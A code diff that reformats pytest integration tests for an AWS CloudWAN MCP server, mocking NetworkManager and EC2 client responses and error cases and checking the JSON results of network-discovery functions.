-                        'asn': 64513
-                    },
-                    {
-                        'location': 'eu-west-1',
-                        'asn': 64514
-                    }
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": ["64512-64555", "65000-65010"],
+                "edge-locations": [
+                    {"location": "us-east-1", "asn": 64512},
+                    {"location": "us-west-2", "asn": 64513},
+                    {"location": "eu-west-1", "asn": 64514},
                 ],
-                'vpn-ecmp-support': True,
-                'inside-cidr-blocks': ['169.254.0.0/16']
+                "vpn-ecmp-support": True,
+                "inside-cidr-blocks": ["169.254.0.0/16"],
             },
-            'segments': [
-                {
-                    'name': 'production',
-                    'require-attachment-acceptance': False,
-                    'isolate-attachments': False
-                },
-                {
-                    'name': 'development',
-                    'require-attachment-acceptance': True,
-                    'isolate-attachments': True
-                }
+            "segments": [
+                {"name": "production", "require-attachment-acceptance": False, "isolate-attachments": False},
+                {"name": "development", "require-attachment-acceptance": True, "isolate-attachments": True},
             ],
-            'segment-actions': [
-                {
-                    'action': 'share',
-                    'segment': 'production',
-                    'share-with': ['development']
-                }
-            ]
+            "segment-actions": [{"action": "share", "segment": "production", "share-with": ["development"]}],
         }
 
         mock_policy_response = {
-            'CoreNetworkPolicy': {
-                'PolicyVersionId': '3',
-                'Alias': 'LIVE',
-                'PolicyDocument': json.dumps(complex_policy_doc),
-                'Description': 'Multi-segment production policy',
-                'CreatedAt': datetime(2024, 1, 15, 10, 30, 45, tzinfo=timezone.utc),
-                'ChangeSetState': 'READY_TO_EXECUTE'
+            "CoreNetworkPolicy": {
+                "PolicyVersionId": "3",
+                "Alias": "LIVE",
+                "PolicyDocument": json.dumps(complex_policy_doc),
+                "Description": "Multi-segment production policy",
+                "CreatedAt": datetime(2024, 1, 15, 10, 30, 45, tzinfo=timezone.utc),
+                "ChangeSetState": "READY_TO_EXECUTE",
             }
         }
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.get_core_network_policy.return_value = mock_policy_response
             mock_get_client.return_value = mock_client
 
-            result = await get_core_network_policy(
-                'core-network-01234567890abcdef',
-                alias='LIVE'
-            )
+            result = await get_core_network_policy("core-network-01234567890abcdef", alias="LIVE")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['policy_version_id'] == '3'
-            assert parsed['alias'] == 'LIVE'
+            assert parsed["success"] is True
+            assert parsed["policy_version_id"] == "3"
+            assert parsed["alias"] == "LIVE"
 
             # Verify policy document structure
-            policy_doc = json.loads(parsed['policy_document'])
-            assert policy_doc['version'] == '2021.12'
-            assert len(policy_doc['segments']) == 2
-            assert len(policy_doc['core-network-configuration']['edge-locations']) == 3
+            policy_doc = json.loads(parsed["policy_document"])
+            assert policy_doc["version"] == "2021.12"
+            assert len(policy_doc["segments"]) == 2
+            assert len(policy_doc["core-network-configuration"]["edge-locations"]) == 3
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_network_manager_api_error_scenarios(self):
         """Test NetworkManager API comprehensive error scenario mocking."""
         error_scenarios = [
+            {"error_code": "ThrottlingException", "error_message": "Rate exceeded", "operation": "ListCoreNetworks"},
             {
-                'error_code': 'ThrottlingException',
-                'error_message': 'Rate exceeded',
-                'operation': 'ListCoreNetworks'
+                "error_code": "ValidationException",
+                "error_message": "Invalid parameter format",
+                "operation": "GetCoreNetworkPolicy",
             },
             {
-                'error_code': 'ValidationException',
-                'error_message': 'Invalid parameter format',
-                'operation': 'GetCoreNetworkPolicy'
+                "error_code": "ConflictException",
+                "error_message": "Resource is being modified",
+                "operation": "UpdateCoreNetwork",
             },
             {
-                'error_code': 'ConflictException',
-                'error_message': 'Resource is being modified',
-                'operation': 'UpdateCoreNetwork'
+                "error_code": "ServiceQuotaExceededException",
+                "error_message": "Quota exceeded for core networks",
+                "operation": "CreateCoreNetwork",
             },
-            {
-                'error_code': 'ServiceQuotaExceededException',
-                'error_message': 'Quota exceeded for core networks',
-                'operation': 'CreateCoreNetwork'
-            }
         ]
 
         for scenario in error_scenarios:
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
                 mock_client.list_core_networks.side_effect = ClientError(
                     {
-                        'Error': {
-                            'Code': scenario['error_code'],
-                            'Message': scenario['error_message']
-                        },
-                        'ResponseMetadata': {
-                            'RequestId': f"req-{scenario['error_code']}-123",
-                            'HTTPStatusCode': 400
-                        }
+                        "Error": {"Code": scenario["error_code"], "Message": scenario["error_message"]},
+                        "ResponseMetadata": {"RequestId": f"req-{scenario['error_code']}-123", "HTTPStatusCode": 400},
                     },
-                    scenario['operation']
+                    scenario["operation"],
                 )
                 mock_get_client.return_value = mock_client
 
                 result = await list_core_networks()
 
                 parsed = json.loads(result)
-                assert parsed['success'] is False
-                assert scenario['error_code'] == parsed['error_code']
-                assert scenario['error_message'] in parsed['error']
+                assert parsed["success"] is False
+                assert scenario["error_code"] == parsed["error_code"]
+                assert scenario["error_message"] in parsed["error"]
 
 
 class TestEC2ServiceMocking:
@@ -260,74 +212,67 @@
         """Test EC2 describe_vpcs with comprehensive VPC attributes."""
         mock_vpcs = [
             {
-                'VpcId': 'vpc-01234567890abcdef0',
-                'State': 'available',
-                'CidrBlock': '10.0.0.0/16',
-                'DhcpOptionsId': 'dopt-12345678',
-                'InstanceTenancy': 'default',
-                'IsDefault': False,
-                'Tags': [
-                    {'Key': 'Name', 'Value': 'Production VPC'},
-                    {'Key': 'Environment', 'Value': 'prod'},
-                    {'Key': 'CostCenter', 'Value': '12345'}
+                "VpcId": "vpc-01234567890abcdef0",
+                "State": "available",
+                "CidrBlock": "10.0.0.0/16",
+                "DhcpOptionsId": "dopt-12345678",
+                "InstanceTenancy": "default",
+                "IsDefault": False,
+                "Tags": [
+                    {"Key": "Name", "Value": "Production VPC"},
+                    {"Key": "Environment", "Value": "prod"},
+                    {"Key": "CostCenter", "Value": "12345"},
                 ],
-                'CidrBlockAssociationSet': [
+                "CidrBlockAssociationSet": [
                     {
-                        'AssociationId': 'vpc-cidr-assoc-12345678',
-                        'CidrBlock': '10.0.0.0/16',
-                        'CidrBlockState': {'State': 'associated'}
+                        "AssociationId": "vpc-cidr-assoc-12345678",
+                        "CidrBlock": "10.0.0.0/16",
+                        "CidrBlockState": {"State": "associated"},
                     }
-                ]
+                ],
             },
             {
-                'VpcId': 'vpc-fedcba0987654321f',
-                'State': 'available',
-                'CidrBlock': '172.16.0.0/12',
-                'DhcpOptionsId': 'dopt-87654321',
-                'InstanceTenancy': 'default',
-                'IsDefault': False,
-                'Tags': [
-                    {'Key': 'Name', 'Value': 'Development VPC'},
-                    {'Key': 'Environment', 'Value': 'dev'}
-                ],
-                'CidrBlockAssociationSet': [
+                "VpcId": "vpc-fedcba0987654321f",
+                "State": "available",
+                "CidrBlock": "172.16.0.0/12",
+                "DhcpOptionsId": "dopt-87654321",
+                "InstanceTenancy": "default",
+                "IsDefault": False,
+                "Tags": [{"Key": "Name", "Value": "Development VPC"}, {"Key": "Environment", "Value": "dev"}],
+                "CidrBlockAssociationSet": [
                     {
-                        'AssociationId': 'vpc-cidr-assoc-87654321',
-                        'CidrBlock': '172.16.0.0/12',
-                        'CidrBlockState': {'State': 'associated'}
+                        "AssociationId": "vpc-cidr-assoc-87654321",
+                        "CidrBlock": "172.16.0.0/12",
+                        "CidrBlockState": {"State": "associated"},
                     },
                     {
-                        'AssociationId': 'vpc-cidr-assoc-secondary',
-                        'CidrBlock': '192.168.0.0/16',
-                        'CidrBlockState': {'State': 'associated'}
-                    }
-                ]
-            }
+                        "AssociationId": "vpc-cidr-assoc-secondary",
+                        "CidrBlock": "192.168.0.0/16",
+                        "CidrBlockState": {"State": "associated"},
+                    },
+                ],
+            },
         ]
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.describe_vpcs.return_value = {
-                'Vpcs': mock_vpcs,
-                'NextToken': None
-            }
+            mock_client.describe_vpcs.return_value = {"Vpcs": mock_vpcs, "NextToken": None}
             mock_get_client.return_value = mock_client
 
-            result = await discover_vpcs(region='us-west-2')
+            result = await discover_vpcs(region="us-west-2")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 2
-            assert parsed['region'] == 'us-west-2'
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 2
+            assert parsed["region"] == "us-west-2"
 
             # Verify VPC details
             prod_vpc = next(
-                (v for v in parsed['vpcs'] if v.get('Tags', [{}])[0].get('Value') == 'Production VPC'),
-                None
+                (v for v in parsed["vpcs"] if v.get("Tags", [{}])[0].get("Value") == "Production VPC"), None
             )
             assert prod_vpc is not None
-            assert prod_vpc['CidrBlock'] == '10.0.0.0/16'
-            assert prod_vpc['State'] == 'available'
+            assert prod_vpc["CidrBlock"] == "10.0.0.0/16"
+            assert prod_vpc["State"] == "available"
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -335,118 +280,112 @@
         """Test EC2 search_transit_gateway_routes with detailed route information."""
         mock_routes = [
             {
-                'DestinationCidrBlock': '10.0.0.0/16',
-                'TransitGatewayAttachments': [
+                "DestinationCidrBlock": "10.0.0.0/16",
+                "TransitGatewayAttachments": [
                     {
-                        'TransitGatewayAttachmentId': 'tgw-attach-01234567890abcdef',
-                        'ResourceId': 'vpc-01234567890abcdef0',
-                        'ResourceType': 'vpc'
+                        "TransitGatewayAttachmentId": "tgw-attach-01234567890abcdef",
+                        "ResourceId": "vpc-01234567890abcdef0",
+                        "ResourceType": "vpc",
                     }
                 ],
-                'Type': 'propagated',
-                'State': 'active',
-                'RouteOrigin': 'EnableVgwRoutePropagation'
+                "Type": "propagated",
+                "State": "active",
+                "RouteOrigin": "EnableVgwRoutePropagation",
             },
             {
-                'DestinationCidrBlock': '172.16.0.0/12',
-                'TransitGatewayAttachments': [
+                "DestinationCidrBlock": "172.16.0.0/12",
+                "TransitGatewayAttachments": [
                     {
-                        'TransitGatewayAttachmentId': 'tgw-attach-fedcba0987654321',
-                        'ResourceId': 'vpc-fedcba0987654321f',
-                        'ResourceType': 'vpc'
+                        "TransitGatewayAttachmentId": "tgw-attach-fedcba0987654321",
+                        "ResourceId": "vpc-fedcba0987654321f",
+                        "ResourceType": "vpc",
                     }
                 ],
-                'Type': 'static',
-                'State': 'active',
-                'RouteOrigin': 'CreateRoute'
+                "Type": "static",
+                "State": "active",
+                "RouteOrigin": "CreateRoute",
             },
             {
-                'DestinationCidrBlock': '192.168.0.0/16',
-                'TransitGatewayAttachments': [],
-                'Type': 'static',
-                'State': 'blackhole',
-                'RouteOrigin': 'CreateRoute'
-            }
+                "DestinationCidrBlock": "192.168.0.0/16",
+                "TransitGatewayAttachments": [],
+                "Type": "static",
+                "State": "blackhole",
+                "RouteOrigin": "CreateRoute",
+            },
         ]
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.search_transit_gateway_routes.return_value = {
-                'Routes': mock_routes,
-                'AdditionalRoutesAvailable': False
+                "Routes": mock_routes,
+                "AdditionalRoutesAvailable": False,
             }
             mock_get_client.return_value = mock_client
 
-            result = await analyze_tgw_routes('tgw-rtb-01234567890abcdef')
+            result = await analyze_tgw_routes("tgw-rtb-01234567890abcdef")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['analysis']['total_routes'] == 3
-            assert parsed['analysis']['active_routes'] == 2
-            assert parsed['analysis']['blackholed_routes'] == 1
+            assert parsed["success"] is True
+            assert parsed["analysis"]["total_routes"] == 3
+            assert parsed["analysis"]["active_routes"] == 2
+            assert parsed["analysis"]["blackholed_routes"] == 1
 
             # Verify route details are preserved
-            route_details = parsed['analysis']['route_details']
-            active_routes = [r for r in route_details if r['State'] == 'active']
+            route_details = parsed["analysis"]["route_details"]
+            active_routes = [r for r in route_details if r["State"] == "active"]
             assert len(active_routes) == 2
 
-            blackhole_routes = [r for r in route_details if r['State'] == 'blackhole']
+            blackhole_routes = [r for r in route_details if r["State"] == "blackhole"]
             assert len(blackhole_routes) == 1
-            assert blackhole_routes[0]['DestinationCidrBlock'] == '192.168.0.0/16'
+            assert blackhole_routes[0]["DestinationCidrBlock"] == "192.168.0.0/16"
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_ec2_transit_gateway_peering_detailed_mock(self):
         """Test EC2 describe_transit_gateway_peering_attachments with detailed peering info."""
         mock_peering_attachment = {
-            'TransitGatewayAttachmentId': 'tgw-attach-01234567890abcdef',
-            'RequesterTgwInfo': {
-                'TransitGatewayId': 'tgw-01234567890abcdef',
-                'OwnerId': '123456789012',
-                'Region': 'us-east-1'
+            "TransitGatewayAttachmentId": "tgw-attach-01234567890abcdef",
+            "RequesterTgwInfo": {
+                "TransitGatewayId": "tgw-01234567890abcdef",
+                "OwnerId": "123456789012",
+                "Region": "us-east-1",
             },
-            'AccepterTgwInfo': {
-                'TransitGatewayId': 'tgw-fedcba0987654321',
-                'OwnerId': '210987654321',
-                'Region': 'us-west-2'
-            },
-            'Status': {
-                'Code': 'available',
-                'Message': 'Peering attachment is available'
+            "AccepterTgwInfo": {
+                "TransitGatewayId": "tgw-fedcba0987654321",
+                "OwnerId": "210987654321",
+                "Region": "us-west-2",
             },
-            'State': 'available',
-            'CreatedAt': datetime(2024, 1, 15, 10, 30, 45, tzinfo=timezone.utc),
-            'Tags': [
-                {'Key': 'Name', 'Value': 'Cross-region peering'},
-                {'Key': 'Purpose', 'Value': 'DR connectivity'}
-            ]
+            "Status": {"Code": "available", "Message": "Peering attachment is available"},
+            "State": "available",
+            "CreatedAt": datetime(2024, 1, 15, 10, 30, 45, tzinfo=timezone.utc),
+            "Tags": [{"Key": "Name", "Value": "Cross-region peering"}, {"Key": "Purpose", "Value": "DR connectivity"}],
         }
 
-        with patch('awslabs.cloudwan_mcp_server.server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.describe_transit_gateway_peering_attachments.return_value = {
-                'TransitGatewayPeeringAttachments': [mock_peering_attachment]
+                "TransitGatewayPeeringAttachments": [mock_peering_attachment]
             }
             mock_get_client.return_value = mock_client
 
             # Import the function that we need to test
             from awslabs.cloudwan_mcp_server.server import analyze_tgw_peers
 
-            result = await analyze_tgw_peers('tgw-attach-01234567890abcdef')
+            result = await analyze_tgw_peers("tgw-attach-01234567890abcdef")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['peer_analysis']['state'] == 'available'
-            assert parsed['peer_analysis']['status'] == 'available'
+            assert parsed["success"] is True
+            assert parsed["peer_analysis"]["state"] == "available"
+            assert parsed["peer_analysis"]["status"] == "available"
 
             # Verify requester and accepter info
-            requester_info = parsed['peer_analysis']['requester_tgw_info']
-            assert requester_info['Region'] == 'us-east-1'
-            assert requester_info['TransitGatewayId'] == 'tgw-01234567890abcdef'
+            requester_info = parsed["peer_analysis"]["requester_tgw_info"]
+            assert requester_info["Region"] == "us-east-1"
+            assert requester_info["TransitGatewayId"] == "tgw-01234567890abcdef"
 
-            accepter_info = parsed['peer_analysis']['accepter_tgw_info']
-            assert accepter_info['Region'] == 'us-west-2'
-            assert accepter_info['TransitGatewayId'] == 'tgw-fedcba0987654321'
+            accepter_info = parsed["peer_analysis"]["accepter_tgw_info"]
+            assert accepter_info["Region"] == "us-west-2"
+            assert accepter_info["TransitGatewayId"] == "tgw-fedcba0987654321"
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -454,43 +393,43 @@
         """Test EC2 describe_regions with comprehensive region information."""
         mock_regions = [
             {
-                'RegionName': 'us-east-1',
-                'Endpoint': 'ec2.us-east-1.amazonaws.com',
-                'OptInStatus': 'opt-in-not-required'
+                "RegionName": "us-east-1",
+                "Endpoint": "ec2.us-east-1.amazonaws.com",
+                "OptInStatus": "opt-in-not-required",
             },
             {
-                'RegionName': 'us-west-2',
-                'Endpoint': 'ec2.us-west-2.amazonaws.com',
-                'OptInStatus': 'opt-in-not-required'
+                "RegionName": "us-west-2",
+                "Endpoint": "ec2.us-west-2.amazonaws.com",
+                "OptInStatus": "opt-in-not-required",
             },
             {
-                'RegionName': 'eu-west-1',
-                'Endpoint': 'ec2.eu-west-1.amazonaws.com',
-                'OptInStatus': 'opt-in-not-required'
+                "RegionName": "eu-west-1",
+                "Endpoint": "ec2.eu-west-1.amazonaws.com",
+                "OptInStatus": "opt-in-not-required",
             },
             {
-                'RegionName': 'ap-southeast-1',
-                'Endpoint': 'ec2.ap-southeast-1.amazonaws.com',
-                'OptInStatus': 'opt-in-not-required'
-            }
+                "RegionName": "ap-southeast-1",
+                "Endpoint": "ec2.ap-southeast-1.amazonaws.com",
+                "OptInStatus": "opt-in-not-required",
+            },
         ]
 
-        with patch('boto3.Session') as mock_session_class:
+        with patch("boto3.Session") as mock_session_class:
             mock_session = Mock()
             mock_client = Mock()
-            mock_client.describe_regions.return_value = {'Regions': mock_regions}
+            mock_client.describe_regions.return_value = {"Regions": mock_regions}
             mock_session.client.return_value = mock_client
             mock_session_class.return_value = mock_session
 
             # Test region validation through aws_config_manager
             from awslabs.cloudwan_mcp_server.server import aws_config_manager
 
-            result = await aws_config_manager('set_region', region='eu-west-1')
+            result = await aws_config_manager("set_region", region="eu-west-1")
 
             parsed = json.loads(result)
             # Should succeed because eu-west-1 is in the mocked regions list
-            assert parsed['success'] is True
-            assert parsed['new_region'] == 'eu-west-1'
+            assert parsed["success"] is True
+            assert parsed["new_region"] == "eu-west-1"
 
 
 class TestIntegratedServiceMocking:
@@ -503,33 +442,27 @@
         # Mock NetworkManager core networks
         mock_core_networks = [
             {
-                'CoreNetworkId': 'core-network-01234567890abcdef',
-                'GlobalNetworkId': 'global-network-01234567890abcdef',
-                'State': 'AVAILABLE'
+                "CoreNetworkId": "core-network-01234567890abcdef",
+                "GlobalNetworkId": "global-network-01234567890abcdef",
+                "State": "AVAILABLE",
             }
         ]
 
         # Mock EC2 VPCs
-        mock_vpcs = [
-            {
-                'VpcId': 'vpc-01234567890abcdef0',
-                'State': 'available',
-                'CidrBlock': '10.0.0.0/16'
-            }
-        ]
+        mock_vpcs = [{"VpcId": "vpc-01234567890abcdef0", "State": "available", "CidrBlock": "10.0.0.0/16"}]
 
         def mock_client_factory(service, region=None):
             """Factory function to return appropriate mocked client."""
             mock_client = Mock()
 
-            if service == 'networkmanager':
-                mock_client.list_core_networks.return_value = {'CoreNetworks': mock_core_networks}
-            elif service == 'ec2':
-                mock_client.describe_vpcs.return_value = {'Vpcs': mock_vpcs}
+            if service == "networkmanager":
+                mock_client.list_core_networks.return_value = {"CoreNetworks": mock_core_networks}
+            elif service == "ec2":
+                mock_client.describe_vpcs.return_value = {"Vpcs": mock_vpcs}
 
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=mock_client_factory):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=mock_client_factory):
             # Test both operations in sequence
             core_networks_result = await list_core_networks()
             vpcs_result = await discover_vpcs()
@@ -538,23 +471,23 @@
             core_parsed = json.loads(core_networks_result)
             vpcs_parsed = json.loads(vpcs_result)
 
-            assert core_parsed['success'] is True
-            assert vpcs_parsed['success'] is True
-            assert core_parsed['total_count'] == 1
-            assert vpcs_parsed['total_count'] == 1
+            assert core_parsed["success"] is True
+            assert vpcs_parsed["success"] is True
+            assert core_parsed["total_count"] == 1
+            assert vpcs_parsed["total_count"] == 1
 
     @pytest.mark.integration
     def test_aws_client_service_isolation_mock(self):
         """Test AWS client service isolation with comprehensive mocking."""
-        with patch('awslabs.cloudwan_mcp_server.server.boto3.client') as mock_boto_client:
+        with patch("awslabs.cloudwan_mcp_server.server.boto3.client") as mock_boto_client:
             # Test different services get different clients
             mock_nm_client = Mock()
             mock_ec2_client = Mock()
 
             def client_side_effect(service, **kwargs):
-                if service == 'networkmanager':
+                if service == "networkmanager":
                     return mock_nm_client
-                elif service == 'ec2':
+                elif service == "ec2":
                     return mock_ec2_client
                 else:
                     return Mock()
@@ -562,8 +495,8 @@
             mock_boto_client.side_effect = client_side_effect
 
             # Test client retrieval
-            nm_client = get_aws_client('networkmanager', region='us-east-1')
-            ec2_client = get_aws_client('ec2', region='us-east-1')
+            nm_client = get_aws_client("networkmanager", region="us-east-1")
+            ec2_client = get_aws_client("ec2", region="us-east-1")
 
             assert nm_client == mock_nm_client
             assert ec2_client == mock_ec2_client
@@ -572,8 +505,8 @@
             # Verify proper service calls
             assert mock_boto_client.call_count == 2
             calls = mock_boto_client.call_args_list
-            assert calls[0][0][0] == 'networkmanager'
-            assert calls[1][0][0] == 'ec2'
+            assert calls[0][0][0] == "networkmanager"
+            assert calls[1][0][0] == "ec2"
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -582,43 +515,43 @@
         error_patterns = [
             # NetworkManager specific errors
             {
-                'service': 'networkmanager',
-                'operation': 'list_core_networks',
-                'error_code': 'CoreNetworkPolicyException',
-                'error_message': 'Policy validation failed',
-                'function': list_core_networks
+                "service": "networkmanager",
+                "operation": "list_core_networks",
+                "error_code": "CoreNetworkPolicyException",
+                "error_message": "Policy validation failed",
+                "function": list_core_networks,
             },
             # EC2 specific errors
             {
-                'service': 'ec2',
-                'operation': 'describe_vpcs',
-                'error_code': 'InvalidVpcID.NotFound',
-                'error_message': 'The vpc ID does not exist',
-                'function': discover_vpcs
-            }
+                "service": "ec2",
+                "operation": "describe_vpcs",
+                "error_code": "InvalidVpcID.NotFound",
+                "error_message": "The vpc ID does not exist",
+                "function": discover_vpcs,
+            },
         ]
 
         for pattern in error_patterns:
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
 
                 # Set up the appropriate method based on the service
-                if pattern['service'] == 'networkmanager':
+                if pattern["service"] == "networkmanager":
                     mock_client.list_core_networks.side_effect = ClientError(
-                        {'Error': {'Code': pattern['error_code'], 'Message': pattern['error_message']}},
-                        pattern['operation']
+                        {"Error": {"Code": pattern["error_code"], "Message": pattern["error_message"]}},
+                        pattern["operation"],
                     )
-                elif pattern['service'] == 'ec2':
+                elif pattern["service"] == "ec2":
                     mock_client.describe_vpcs.side_effect = ClientError(
-                        {'Error': {'Code': pattern['error_code'], 'Message': pattern['error_message']}},
-                        pattern['operation']
+                        {"Error": {"Code": pattern["error_code"], "Message": pattern["error_message"]}},
+                        pattern["operation"],
                     )
 
                 mock_get_client.return_value = mock_client
 
-                result = await pattern['function']()
+                result = await pattern["function"]()
 
                 parsed = json.loads(result)
-                assert parsed['success'] is False
-                assert pattern['error_code'] == parsed['error_code']
-                assert pattern['error_message'] in parsed['error']
+                assert parsed["success"] is False
+                assert pattern["error_code"] == parsed["error_code"]
+                assert pattern["error_message"] in parsed["error"]

--- cloudwan-mcp-server/tests/integration/test_cloudwan_api_operations.py
+++ cloudwan-mcp-server/tests/integration/test_cloudwan_api_operations.py
@@ -43,19 +43,19 @@
     @pytest.mark.asyncio
     async def test_list_core_networks_success_empty(self):
         """Test list_core_networks with empty result."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.list_core_networks.return_value = {'CoreNetworks': []}
+            mock_client.list_core_networks.return_value = {"CoreNetworks": []}
             mock_get_client.return_value = mock_client
 
             result = await list_core_networks()
 
             assert isinstance(result, str)
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert 'message' in parsed
-            assert parsed['core_networks'] == []
-            assert 'region' in parsed
+            assert parsed["success"] is True
+            assert "message" in parsed
+            assert parsed["core_networks"] == []
+            assert "region" in parsed
             mock_client.list_core_networks.assert_called_once()
 
     @pytest.mark.integration
@@ -64,53 +64,52 @@
         """Test list_core_networks with sample core networks."""
         sample_networks = [
             {
-                'CoreNetworkId': 'core-network-01234567890abcdef',
-                'GlobalNetworkId': 'global-network-01234567890abcdef',
-                'State': 'AVAILABLE',
-                'CreatedAt': datetime(2024, 1, 15, 10, 30, 45),
-                'Description': 'Production core network'
+                "CoreNetworkId": "core-network-01234567890abcdef",
+                "GlobalNetworkId": "global-network-01234567890abcdef",
+                "State": "AVAILABLE",
+                "CreatedAt": datetime(2024, 1, 15, 10, 30, 45),
+                "Description": "Production core network",
             },
             {
-                'CoreNetworkId': 'core-network-fedcba0987654321',
-                'GlobalNetworkId': 'global-network-fedcba0987654321',
-                'State': 'AVAILABLE',
-                'CreatedAt': datetime(2024, 1, 16, 11, 45, 30),
-                'Description': 'Development core network'
-            }
+                "CoreNetworkId": "core-network-fedcba0987654321",
+                "GlobalNetworkId": "global-network-fedcba0987654321",
+                "State": "AVAILABLE",
+                "CreatedAt": datetime(2024, 1, 16, 11, 45, 30),
+                "Description": "Development core network",
+            },
         ]
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.list_core_networks.return_value = {'CoreNetworks': sample_networks}
+            mock_client.list_core_networks.return_value = {"CoreNetworks": sample_networks}
             mock_get_client.return_value = mock_client
 
-            result = await list_core_networks(region='us-west-2')
+            result = await list_core_networks(region="us-west-2")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 2
-            assert len(parsed['core_networks']) == 2
-            assert parsed['region'] == 'us-west-2'
-            assert parsed['core_networks'][0]['CoreNetworkId'] == 'core-network-01234567890abcdef'
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 2
+            assert len(parsed["core_networks"]) == 2
+            assert parsed["region"] == "us-west-2"
+            assert parsed["core_networks"][0]["CoreNetworkId"] == "core-network-01234567890abcdef"
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_list_core_networks_client_error(self):
         """Test list_core_networks with AWS ClientError."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.list_core_networks.side_effect = ClientError(
-                {'Error': {'Code': 'AccessDenied', 'Message': 'User not authorized'}},
-                'ListCoreNetworks'
+                {"Error": {"Code": "AccessDenied", "Message": "User not authorized"}}, "ListCoreNetworks"
             )
             mock_get_client.return_value = mock_client
 
             result = await list_core_networks()
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert 'User not authorized' in parsed['error']
-            assert parsed['error_code'] == 'AccessDenied'
+            assert parsed["success"] is False
+            assert "User not authorized" in parsed["error"]
+            assert parsed["error_code"] == "AccessDenied"
 
 
 class TestGetGlobalNetworksOperation:
@@ -122,41 +121,41 @@
         """Test get_global_networks with successful response."""
         sample_networks = [
             {
-                'GlobalNetworkId': 'global-network-01234567890abcdef',
-                'State': 'AVAILABLE',
-                'CreatedAt': datetime(2024, 1, 15, 10, 30, 45),
-                'Description': 'Main global network'
+                "GlobalNetworkId": "global-network-01234567890abcdef",
+                "State": "AVAILABLE",
+                "CreatedAt": datetime(2024, 1, 15, 10, 30, 45),
+                "Description": "Main global network",
             }
         ]
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.describe_global_networks.return_value = {'GlobalNetworks': sample_networks}
+            mock_client.describe_global_networks.return_value = {"GlobalNetworks": sample_networks}
             mock_get_client.return_value = mock_client
 
-            result = await get_global_networks(region='eu-west-1')
+            result = await get_global_networks(region="eu-west-1")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 1
-            assert parsed['region'] == 'eu-west-1'
-            assert len(parsed['global_networks']) == 1
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 1
+            assert parsed["region"] == "eu-west-1"
+            assert len(parsed["global_networks"]) == 1
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_get_global_networks_empty_result(self):
         """Test get_global_networks with no global networks."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.describe_global_networks.return_value = {'GlobalNetworks': []}
+            mock_client.describe_global_networks.return_value = {"GlobalNetworks": []}
             mock_get_client.return_value = mock_client
 
             result = await get_global_networks()
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 0
-            assert parsed['global_networks'] == []
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 0
+            assert parsed["global_networks"] == []
 
 
 class TestGetCoreNetworkPolicyOperation:
@@ -167,54 +166,53 @@
     async def test_get_core_network_policy_success(self):
         """Test get_core_network_policy with successful response."""
         sample_policy = {
-            'PolicyVersionId': '1',
-            'PolicyDocument': json.dumps({
-                'version': '2021.12',
-                'core-network-configuration': {
-                    'asn-ranges': ['64512-64555'],
-                    'edge-locations': [{'location': 'us-east-1'}]
+            "PolicyVersionId": "1",
+            "PolicyDocument": json.dumps(
+                {
+                    "version": "2021.12",
+                    "core-network-configuration": {
+                        "asn-ranges": ["64512-64555"],
+                        "edge-locations": [{"location": "us-east-1"}],
+                    },
                 }
